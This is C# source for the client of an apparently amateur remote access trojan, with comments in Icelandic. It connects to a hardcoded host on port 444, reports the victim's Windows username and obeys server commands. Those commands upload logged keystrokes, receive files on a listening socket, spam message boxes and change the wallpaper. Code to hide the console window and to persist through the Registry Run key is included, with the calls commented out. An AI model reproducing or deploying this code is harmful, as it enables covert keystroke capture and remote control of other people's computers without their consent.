using System;
using System.Net.Sockets;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Text;


namespace client
{
    class Program
    {

        
        static TcpClient client;  //heldur utan um tcp
        static IPEndPoint point; //heldur utan um ip og port
        static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name; //Fa usernameid
        const int SW_HIDE = 0; //til að fela glugga ekki breyta
        public static string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string fName;
        static void Main()
        {
            Thread starter = new Thread(Connect);
            Thread starter2 = new Thread(Starting2);
            // Activataðu þetta tvent til að KL'inn fari í background
            //var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);

            //startup();        startup vilt kannski hafa þetta disable'að :)
            string ipnumber = null;
            IPAddress[] array = Dns.GetHostAddresses("192.168.1.250"); //noipid
            foreach (IPAddress ip in array)
            {
                ipnumber = ip.ToString();
            }
            point = new IPEndPoint(IPAddress.Parse(ipnumber), 444); //breyta port og breyta ipnumber í "127.0.0.1"
            client = new TcpClient();

            starter.Start(); //threads
            starter2.Start(); //threads
            

            
            
            Process.GetCurrentProcess().WaitForExit();
        }
        static void Starting2() //hérna fer tengingin í gang
        {

            InterceptKeys.Run(); //keyrir keyLoggið í gang 

        }

        static private void startup() //startuppið duhh
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(
                           @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                
                //Surround path with " " to make sure that there are no problems
                //if path contains spaces.
                key.SetValue("Client", "\"" + Application.ExecutablePath + "\"");

                //Delete Registry
                //key.DeleteValue("Client");
                key.Close();
            }
            catch
            {

            }
            
        }

        static void Connect() //hérna fer tengingin í gang
        {
            try
            {
                client.Connect(point);
                Send("USERNAME|" + userName); //Hérna er usernameið á tölvunni sent á serverinn
                Thread.Sleep(100); //set smá delay svo 2 skilaboð eru ekki sent á sama tíma
                Send("CONNECTED|"); //skilaboð um tengingu er sent hér

                client.GetStream().BeginRead(new byte[0], 0, 0, Read, null); 
            }
            catch
            {
                
                Thread.Sleep(3000);
                Connect();
            }
        }
        static void Read(IAsyncResult ar) //hérna eru gögnin sem sent eru á clientinn lesin
        {

            try
            {
                StreamReader reader = new StreamReader(client.GetStream());
                Parse(reader.ReadLine()); //gögnin sent til parse sem vinnur úr þeim
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, Read, null);
            }
            catch
            {
                Thread.Sleep(3000);
                Connect();
            }
        }
        static void Parse(string msg) 
        {

            string[] cut = msg.Split('|'); //no comment
            switch (cut[0]) // hér eru öll commands sem serverinn sendir á clientinn mótekinn
            {
                case "MSGBOX": //ef serverinn sendir MSGBOX þá er skilaboðin  
                    SendStatus("Skilabod Send: " + cut[1]); //Skilaboð fyrir statusinn á serverinum send hér.
                    DialogResult result = MessageBox.Show(cut[2].Replace("[LINE]", Environment.NewLine), cut[1]);
                    if (result == DialogResult.OK)
                    {
                        
                    }
                    else if (result == DialogResult.No)
                    {

                    }//Hérna er sent á breytuna messagebox sem keyrir messagebox popup
                    break;
                case "SPAMMERINO":
                    SendStatus("SPAM SUCCESSFULL"); 
                    for (int i = 0; i < 10; i++)
                    {
                        MessageBox.Show("Trololo", "Trolololino");
                    }
                    break;
                case "GETLOGS": 
                    SendLogs(); //sendir keylogging gögnin
                    break;
                case "STOP":
                    client.Close(); //hérna er breyta notuð ef serverinn vill connecta við clientinn seinna.
                    Application.Restart();
                    Process.GetCurrentProcess().Kill(); //var búinn að reyna að finna leið í meira en 2 klukkutíma en gafst upp á því og fer stytri leiðina með að restarta forritinu
                    break;
                case "FILE":

                    Server();

                    break;
                case "BGROUNDCHANGE": //breytir background myndinni
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\" + fName; 
                    Uri uri = new System.Uri(path);
                    Wallpaper.Set(uri, Wallpaper.Style.Centered);
                    break;

            }
        }
        static void Send(string msg) //notað fyrir Connection() þessi classi sendir skilaboð á serverinn um tengingu
        {
            try
            {
                StreamWriter writer = new StreamWriter(client.GetStream());
                writer.WriteLine(msg);
                writer.Flush();
            }
            catch
            {

            }
        }
        static void SendStatus(string msg) // sendir status á clientinum
        {
            try
            {
                StreamWriter writer = new StreamWriter(client.GetStream());
                writer.WriteLine("STATUS|" + msg);
                writer.Flush();
            }
            catch
            {
            }
        }
        static void SendLogs() //sendir keylogs
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Temp.txt";
            StreamReader lesari = new StreamReader(path, true);
            string msge = lesari.ReadToEnd();
            try
            {
                StreamWriter writer = new StreamWriter(client.GetStream());
                writer.WriteLine("LOGS|" + userName + " " + msge + "          >>>>"); //var ekkert að vanda mig mikið en /n eða /r virkar ekki með þessu :(
                writer.Flush();
            }
            catch
            {
            }
            lesari.Close();
        }


        


        static void Server()
        {
            IPEndPoint end;
            Socket sock;
            end = new IPEndPoint(IPAddress.Any, 2014);
            sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
            sock.Bind(end);
            try
            {
                sock.Listen(100);
                Socket clientSock = sock.Accept();
                byte[] clientData = new byte[1024 * 5000];
                int receivedByteLen = clientSock.Receive(clientData);
                int fNameLen = BitConverter.ToInt32(clientData, 0);
                fName = Encoding.ASCII.GetString(clientData, 4, fNameLen);
                BinaryWriter write = new BinaryWriter(File.Open(path + "/" + fName, FileMode.Append));
                write.Write(clientData, 4 + fNameLen, receivedByteLen - 4 - fNameLen);
                write.Close();
                clientSock.Close();

            }
            catch
            {

            }
        }

        

        //
        // Notað til að KL geti farið í background
        //
        [DllImport("user32.dll")] 
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
    }
}